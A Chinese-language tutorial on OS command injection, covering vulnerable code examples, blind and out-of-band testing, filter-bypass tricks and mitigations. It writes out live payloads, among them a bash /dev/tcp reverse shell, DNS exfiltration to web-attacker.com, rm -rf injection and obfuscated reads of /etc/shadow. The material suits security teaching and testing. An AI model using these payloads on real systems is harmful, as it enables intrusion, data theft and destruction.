# 命令注入

> 之后或需整合二进制主题的系统命令或文档

操作系统命令注入：当 API 端点将用户输入传送到操作系统命令，且用户输入未经过适当验证或清理。它允许攻击者在运行应用程序的服务器上执行操作系统（OS）命令，通常可以完全控制应用程序及其数据。通常，攻击者可以利用 OS 命令注入漏洞进一步破坏托管基础设施的其他部分，并利用信任关系将攻击转向组织内的其他系统。

区分“编程语言代码注入”与“操作系统命令注入”：
- 编程语言代码注入
    ```py
    eval(f"{注入数据}") # python 解释器
    eval("__import__('os').system('ls')")
    ```
- 操作系统命令注入
    ```py
    os.system(f"{注入数据}") # shell 字符串
    os.system("ls")
    ```

能够对基于 Unix 的 OS（Macintosh 或 Linux）执行命令（通常是 Bash）具有非常严重的风险。如果攻击者直接访问主机 Unix OS（超过 95% 的服务器基于 Unix），并且命令在超级用户权限下执行，攻击者能够完全控制整个服务器。

受感染的 OS 使黑客能够访问许多非常关键的文件和权限，例如：

- `/etc/passwd`：跟踪 OS 上的每个用户账户
- `/etc/shadow`：包含用户的加密密码
- `~/.ssh`：包含用于与其他系统通信的 SSH 密钥
- `/etc/apache2/httpd.conf`：基于 Apache 的服务器的配置
- `/etc/nginx/nginx.conf`：基于 Nginx 的服务器的配置

此外，命令注入可能不仅给予我们读取权限，还可能给予我们对这些文件的写入权限。

像这样的漏洞打开了一整套潜在攻击，我们可以利用命令注入造成比预期更大的破坏，包括：

- 从服务器窃取数据。
- 重写日志文件以隐藏我们的踪迹。
- 添加具有写入权限的额外数据库用户以备后用。
- 删除服务器上的重要文件。
- 擦除服务器并使其瘫痪。
- 利用与其他服务器/API 的集成（例如，使用服务器的 Sendgrid 密钥发送垃圾邮件）。
- 将 Web 应用中的单个登录表单更改为向我们的网站发送未加密密码的网络钓鱼表单。
- 锁定管理员并将其置于勒索之下。

基于 Unix 的操作系统上的缓解措施之一是强大的权限系统，它可以通过减少受损端点可能造成的损害来降低部分风险。基于 Unix 的操作系统允许对文件、目录、用户和命令应用详细权限。正确设置这些权限可以强制 API 以非特权用户身份运行，从而潜在地消除前述许多威胁的风险。不幸的是，大多数面临命令注入风险的应用并未采取这些步骤为其代码创建高级用户权限配置文件。

许多非定制和定制Web应用程序中都存在这种命令注入缺陷。在为企业服务器或防火墙、打印机和路由器之类的设备提供管理界面的应用程序中，这类缺陷尤其普遍。

## 示例

### perl 示例

在此示例中，一个购物应用程序允许用户查看某个商品在特定商店是否有库存。该信息通过以下 URL 访问：

```http
https://insecure-website.com/stockStatus?productID=381&storeID=29
```

为了提供库存信息，应用程序必须查询各种遗留系统。由于历史原因，该功能通过调用 Shell 命令并将产品 ID 和商店 ID 作为参数来实现：

```sh
stockreport.pl 381 29
```

该命令输出指定商品的库存状态，并返回给用户。

应用程序没有针对 OS 命令注入的任何防御措施，因此攻击者可以提交以下输入来执行任意命令：

```sh
& echo aiwefwlguh &
```

如果该输入通过 `productID` 参数提交，应用程序执行的命令变为：

```sh
stockreport.pl & echo aiwefwlguh & 29
```

`echo` 命令会使提供的字符串在输出中被回显。这是测试某些类型 OS 命令注入的有用方法。`&` 字符是 Shell 命令分隔符。在此示例中，它导致三个独立的命令依次执行。返回给用户的输出为：

```log
Error - productID was not provided
aiwefwlguh
29: command not found
```

三行输出表明：

- 原始的 `stockreport.pl` 命令在没有预期参数的情况下执行，因此返回了错误消息。
- 注入的 `echo` 命令被执行，提供的字符串在输出中被回显。
- 原始参数 `29` 被当作命令执行，导致错误。

在注入的命令之后放置额外的命令分隔符 `&` 很有用，因为它将注入的命令与注入点之后的任何内容分隔开。这降低了后续内容阻止注入命令执行的可能性。

### JS 示例

```javascript
const exec = require('child_process').exec;
const fs = require('fs');
const safe_converter = require('safe_converter');

/*
 * 上传要存储在服务器上的视频。
 *
 * 使用 `safe_converter` 库转换原始视频，
 * 然后从磁盘中删除原始视频，并向请求者返回 HTTP 200 状态码。
 */
app.post('/uploadVideo', function(req, res) {
  if (!session.isAuthenticated) { return res.sendStatus(401); }

  /*
   * 将原始视频数据写入磁盘，稍后可以压缩并从磁盘中删除。
   */
  fs.writeFileSync(`/videos/raw/${req.body.name}`, req.body.video);

  /*
   * 转换原始、未优化的视频——生成优化后的视频。
   */
  safe_converter.convert(`/videos/raw/${req.body.name}`,
                         `/videos/converted/${req.body.name}`)
    .then(() => {
      /*
       * 当不再需要原始视频文件时删除它。
       * 保留优化后的视频文件。
       */
      exec(`rm /videos/raw/${req.body.name}`);
      return res.sendStatus(200);
    });
});
```

此示例中有几个操作：

1. 我们将视频数据写入磁盘的 `/videos/raw` 目录。
2. 我们转换原始视频文件，将输出写入 `/videos/converted`。
3. 我们删除原始视频（不再需要）。

这是一个非常典型的压缩工作流程。然而，在此示例中，删除原始视频文件的那行 `exec(rm /videos/raw/${req.body.name});` 依赖于未清理的用户输入来确定要删除的视频文件名。

此外，该名称不是参数化的，而是作为字符串拼接到 Bash 命令中。这意味着在视频被删除后，可能存在附加命令。让我们评估一个可能导致此情况的场景：

```javascript
// 要在 POST 请求中发送的名称
const name = 'myVideo.mp4 && rm -rf /videos/converted/';
```

### python 示例

假设 example.com 还有一个功能，允许你下载远程文件并在网站上查看它。为了实现此功能，应用程序使用系统命令`wget`来下载远程文件：

```python
import os

def download(url):
    os.system("wget -O- {}".format(url))

display(download(user_input.url))
```

`wget`命令是一个给定URL下载网页的工具，`-O-`选项使`wget`下载文件并将其显示在标准输出中。综合起来，该程序从用户输入获取URL，并将其传递给使用`os.system()`执行的`wget`命令。例如，如果你提交以下请求，应用程序将下载Google首页的源代码并显示给你：

```http
GET /download?url=google.com
Host: example.com
```

由于用户输入被直接传递到系统命令中，攻击者甚至可以不使用Python函数就注入系统命令。这是因为在Linux命令行中，分号（`;`）字符分隔各个命令，因此攻击者可以在`wget`命令之后通过分号后跟任意命令来执行任意命令。例如，以下输入将导致应用程序向IP `10.0.0.1`的8080端口生成一个反向shell：

```http
GET /download?url="google.com;bash -i >& /dev/tcp/10.0.0.1/8080 0>&1"
Host: example.com
```

## 测试目标

- 识别并评估命令注入点。
- 绕过特殊字符和操作系统命令过滤器。

## 如何测试

攻击者可以利用这种行为注入另外一个命令并获得输出结果

通过提交专门设计的、包含shell元字符的输入（对处理命令的解释器而言，这些字符有着特殊的含义），破坏开发者预先设定的命令，并注入他自己的命令。
- `|` 管道符可用于将一个进程的输出重定向为另一个进程的输入，从而将几个命令连接在一起。
- `&` 字符用于将几个命令组合在一起
- `;` 分号字符可用于在单独一个参数中将几个命令连接在一起。

在应用程序解析过程中，通过调用外部进程或访问文件系统，应该能确定任何Web应用程序与基础操作系统交互的情形。攻击者开始攻击前要探查所有这些功能，寻找命令注入漏洞。然而，实际上，应用程序发出的操作系统命令中可能包含用户提交的任何数据项，包括每个URL、请求主体参数及cookie。因此，为对应用程序进行全面彻底的测试，必须检查每项应用程序功能中的所有这些数据项。

不同的命令解释器处理shell元字符的方式各不相同。理论上，任何类型的应用程序开发平台或Web服务器可能会调用任何类型的shell解释器，在它自己或任何其他主机的操作系统上运行。因此，不应根据对Web服务器操作系统的了解，对应用程序如何处理元字符做出任何假设。

有两种类型的元字符可用于在一个现有的预先设定的命令中注入一个独立的命令。

- 字符`;` `|` `&`和换行符可用于将几个命令逐个连接在一起。有些时候，可以成对使用这些字符以达到不同的效果。

- 反引号`` ` ``用于将一个独立的命令包含在最初的命令处理的数据中。把一个注入的命令放在反引号内shell解释器就会执行该命令，并用这个命令的结果代替被包含的文本，然后继续执行得到的命令字符串。

在识别出 OS 命令注入漏洞后，执行一些初始命令以获取有关系统的信息。然后就可以设法提升自己的权限，进而秘密访问应用程序中的敏感数据，或者通过被攻破的服务器攻击其他主机。以下是一些在 Linux 和 Windows 平台上有用的命令摘要：

| 命令用途 | Linux | Windows |
|---|---|---|
| 当前用户名 | `whoami` | `whoami` |
| 操作系统信息 | `uname -a` | `ver` |
| 网络配置 | `ifconfig` | `ipconfig /all` |
| 网络连接 | `netstat -an` | `netstat -an` |
| 运行进程 | `ps -ef` | `tasklist` |

## 测试盲 OS 命令注入

许多 OS 命令注入实例是盲漏洞。这意味着应用程序不会在其 HTTP 响应中返回结果，也不会以任何可确定的方式影响应用程序随后的处理过程。或者由于几个命令连接在一起，注入命令的执行结果在执行过程中丢失了。

例如，假设一个网站允许用户提交关于该网站的反馈。用户输入其电子邮件地址和反馈消息。然后，服务器端应用程序会生成一封包含反馈的电子邮件发送给网站管理员。为此，它使用提交的详细信息调用 `mail` 程序：

```sh
mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com
```

`mail` 命令的输出（如果有）不会在应用程序的响应中返回，因此使用 `echo` 载荷无效。在这种情况下，你可以使用多种其他技术来检测和利用漏洞。

### 使用时间延迟检测盲 OS 命令注入

通常，检测命令注入是否可行的最可靠方法是使用时间延迟推断，类似于前利用盲目SQL注入时使用的方法。如果一个潜在的漏洞可能存在，那么就可以使用其他方法确定这个漏洞，并获得注入命令的执行结果

通常可以使用`ping`命令让服务器在一段时期内检测它的回环接口（loopback interface），从而触发时间延迟。Windows和UNIX平台在处理命令分隔符与ping命令方面存在一些细微的差别

```sh
& ping -c 10 127.0.0.1 &
```

如果应用程序过滤掉某些命令分隔符，应轮流向每一个目标参数提交各种分隔/终止字符串，并监控应用程序进行响应的时间。

- 这些命令也将响应延迟10秒：

    ```bash
    | sleep 10;
    & sleep 10;
    ` sleep 10;`
    $(sleep 10)
    ```

如果发生时间延迟，说明应用程序可能易于受到命令注入攻击。重复几次测试过程，确定延迟不是由于网络延时或其他异常造成的。尝试更改时间延迟参数的值，并确定经历的时间延迟是否会随着提交的值发生对应的变化。


### 通过重定向输出利用盲 OS 命令注入

攻击者尝试将注入命令的输出重定向到 Web 根目录下的可访问文件中，然后使用浏览器检索该文件。例如，如果应用程序从文件系统位置 `/var/www/static` 提供静态资源，则提交以下输入：

```
& whoami > /var/www/static/whoami.txt &
```

`>` 字符将 `whoami` 命令的输出发送到指定文件。然后，使用浏览器获取 `https://vulnerable-website.com/whoami.txt` 以检索该文件，并查看注入命令的输出。

### 使用带外（OAST）技术利用盲 OS 命令注入

使用注入的命令触发与你控制的系统的带外网络交互，使用 OAST 技术。例如：

```sh
host web-attacker.com
nslookup web-attacker.com
curl web-attacker.com
```

此载荷使用 `nslookup` 命令导致对指定域进行 DNS 查找。攻击者监控是否发生查找，以确认命令是否成功注入。

带外通道提供了一种简单的方法来泄露注入命令的输出（窃取数据作为子域名的 DNS 查找）：

```sh
& nslookup `whoami`.web-attacker.com &
```

这会导致向攻击者的域发起 DNS 查找，其中包含 `whoami` 命令的结果：

```
wwwuser.kgji2ohoyw.web-attacker.com
```

之后可尝试打开一条通向自己计算机的带外通道。尝试使用 TFTP 上传工具至服务器，使用 telnet 或 netcat 建立一个通向自己计算机的反向 shell，并使用 mail 命令通过 SMTP 发送命令结果。

### 受限注入

有时，由于某些字符被过滤掉，或者应用程序所使用的命令API的特殊行为，可能无法注入一个完全独立的命令。但是，攻击者仍然可以破坏所执行的命令的行为，得到想要的结果。

- `<` `>` 重定向符读写文件

- ` ` 空格新增参数
    如果应用程序过滤空格，并且攻击的是UNIX平台，那么他可以使用包含空白符字段分隔符的`$IFS`环境变量代替空格。

## 命令注入的特殊字符

特殊字符用于将多个命令链接在一起。这些字符将根据 Web 服务器上运行的操作系统而有所不同。
例如，以下类型的命令链接可以在 Windows 和基于 Unix 的系统上使用：

- `cmd1|cmd2`：无论 cmd1 是否成功，cmd2 都将执行。
- `cmd1||cmd2`：仅当 cmd1 失败时，cmd2 才会执行。
- `cmd1&&cmd2`：仅当 cmd1 成功时，cmd2 才会执行。
- `cmd1&cmd2`：无论 cmd1 是否成功，cmd2 都将执行。

以下命令分隔符仅适用于基于 Unix 的系统：

- `;`
- 换行符（`0x0a` 或 `\n`）


此外，在基于 Unix 的系统上，命令替换在原始命令中内联执行注入的命令，示例：

```bash
$(whoami)
`whoami`
```

另外，Linux 文件描述符如 `>(cmd)`、`<(cmd)` 也可使用。

不同的 Shell 元字符具有微妙不同的行为，可能在某些情况下是否有效会有所不同。这可能影响它们是否允许带内检索命令输出，或仅对盲利用有用。

有时，你控制的输入会出现在原始命令的引号内。在这种情况下，你需要在使用适当的 Shell 元字符注入新命令之前终止引号上下文（使用 `"` 或 `'`）。

## 过滤器绕过

为了防止操作系统命令注入，Web 开发人员经常使用过滤器。然而，这些过滤器有时未正确实现，使得攻击者能够绕过它们。
在本节中，我们将介绍用于绕过这些过滤器的不同技术。

### 方法

首先，在尝试绕过过滤器之前，对过滤器的工作原理有基本了解始终是良好实践。
以下是我们遇到过滤器时可以使用的通用方法：

- 过滤器是客户端还是服务器端？
- 过滤器是应用于特殊字符、操作系统命令，还是两者都有？
- Web 应用使用的是白名单还是黑名单过滤器？
- Web 服务器运行的是什么操作系统？这让我们了解可以使用的命令和特殊字符。

### 特殊字符过滤器绕过

如前所述，过滤器可以应用于特殊字符、操作系统命令或两者。
要绕过应用于特殊字符的过滤器，我们可以使用环境变量、Bash 花括号扩展或 URL 编码。

#### URL 编码

如果 Web 服务器仅阻止明文特殊字符，则对特殊字符进行 URL 编码可以让我们绕过过滤器。
以下是一些特殊字符及其 URL 编码格式：

|特殊字符|URL 编码|
|-----------------|------------|
|;                | %3b        |
|空格             | %20        |
|制表符           | %09        |
|&                | %26        |
|换行             | %0a        |

例如，我们可以使用 `%3bwhoami` 代替 `;whoami`。

#### 环境变量

空格、分号、制表符或换行符等特殊字符通常会被 Web 服务器过滤，尤其是当它们对指定输入无用时。
为了绕过此限制，我们可以使用环境变量，例如 Linux 上的 **IFS**、**PATH** 或 **LS_COLORS**，以及 Windows 上的 **HOMEPATH**。
例如，在 Linux 上，`/`、`;` 和 `[space]` 可以分别替换为 `${PATH:0:1}`、`${LS_COLORS:10:1}` 和 `${IFS}`。
在 Windows CMD 上，我们可以用 `%HOMEPATH:~6,1%` 替换 `\`，或在 PowerShell 中使用 `$env:HOMEPATH[0]`。

#### Bash 花括号扩展

Bash 花括号扩展将展开字符串，而 bash 作为解释器解析字符串，可用花括号执行命令。
例如，`{ls,-la}` 将执行 `ls -la` 命令。如果 Web 服务器过滤空格、换行或制表符，这将非常有用。
假设我们要显示 '/etc/passwd' 文件的内容。那么，我们可以使用 `;{cat,/etc/passwd}` 代替 `;cat /etc/passwd`。
也就是说，需要注意的是，此技术仅在 Web 服务器使用 Bash 且 `}{/,;` 等字符未被过滤时才有效。

### 命令过滤器绕过

在本节中，我们将探讨一些用于绕过应用于操作系统命令的过滤器的技术。

#### 大小写修改

大小写修改是一种用于绕过操作系统命令过滤器的技术。如果服务器端过滤器区分大小写，这将很有帮助。
例如，如果在测试过程中，我们注意到 Web 服务器阻止了 `;whoami`，我们可以尝试使用 `;WhoAmi`，并发现服务器端过滤器仅阻止小写命令，那么我们就能绕过它。
请注意，此技术通常适用于 Windows 系统。
在 Linux 上，我们将使用一种称为**字符移位**的技术（字符串处理命令的花哨名称）。例如，以下命令将每个大写字符转换为对应的小写字符。

```bash
;$(tr "[A-Z]" "[a-z]"<<<"WhoaMi")
```

#### 字符插入

`\`、`$@`、`'` 等字符可以插入 Linux 操作系统命令中，而不影响命令的正常执行。
例如，`who\ami`、`w$@hoami` 或 `wh'o'ami` 都将执行 `whoami` 命令。

请注意，Linux 命令中的单引号 `'` 数量必须是**偶数**，否则会出现错误。如果您使用 Windows CMD，请确保使用双引号 `"`。
此外，您还可以在 CMD 命令中使用插入符 `^`。例如，`whoa^mi` 将执行 `whoami` 命令。这在 PowerShell 中不起作用。

Unix系统命令中，可插入引号和双引号而不改变命令的行为。如果系统正在过滤某些字符串，你也可以使用通配符替换任意字符。最后，任何空的命令替换结果都可以插入到字符串中而不改变结果。例如，以下命令都将打印`/etc/shadow`的内容：

```bash
cat /etc/shadow
cat "/e"tc'/shadow'
cat /etc/sh*dow
cat /etc/sha``dow
cat /etc/sha$()dow
cat /etc/sha${}dow
```

#### Base64 编码

在某些情况下，Web 服务器可能会过滤 `whoami`、`id` 等命令。
假设 `whoami` 被 Web 服务器阻止。因此，我们不能使用像 `;whoami` 这样的载荷。
为了绕过此限制，我们将使用 `whoami` 的 base64 编码格式，执行：`echo -n 'whoami' | base64`。这将返回 `d2hvYW1p`。
之后，我们将以下载荷发送到易受攻击的参数中：`;bash<<<$(base64 -d<<< d2hvYW1p)`。这应能绕过服务器端过滤器，并允许我们实现远程命令执行。

**最后，请注意，您可能需要结合不同的特殊字符和操作系统命令过滤器绕过技术，才能成功绕过 Web 服务器设置的各种过滤器。**

## 盲命令注入

有时，我们可能无法在 Web 服务器的 HTTP 响应中看到注入命令的输出。因此，我们需要找到一种方法来确认注入是否成功。为此，我们可以使用我们控制下的 `HTTP`、`DNS` 或 `SMTP` 远程服务器。
我们还可以使用**时间延迟系统命令**，如 `sleep`（Linux）、`timeout`（Windows）或 `ping` 等网络工具。
例如，我们可以执行 `;sleep(5)`，如果 Web 服务器在发回响应之前等待了 5 秒，我们可以确认它存在盲命令注入漏洞。
此外，我们还可以**将注入命令的输出重定向到 Web 服务器的 Web 根目录**。`;whoami>/var/www/html/poc.txt;`
之后，我们可以执行 `curl http://website.com/poc.txt`。如果能够检索到该文件，则可以确认 Web 服务器存在盲命令注入漏洞。

## 修复

### 清理

除非绝对必要，避免在应用程序中使用执行操作系统命令的函数。在几乎所有情况下，都可以使用更安全的平台 API 以不同方式实现所需功能。例如，复制文件时，使用 PHP 内置函数 `copy("/path/to/file1.txt", "/path/to/file2.txt")`，它完成相同的操作，而不是 `system("cp /path/to/file1.txt /path/to/file2.txt")`。

如果必须使用用户提供的输入调用 OS 命令，则必须执行严格的输入验证。一些有效验证的示例包括：

- 针对允许值的白名单进行验证。
- 验证输入是否为数字。
- 验证输入仅包含字母数字字符，不包含其他语法或空格。

### 权限

Web 应用程序及其组件应在细粒度的严格权限下运行，不允许执行操作系统命令。
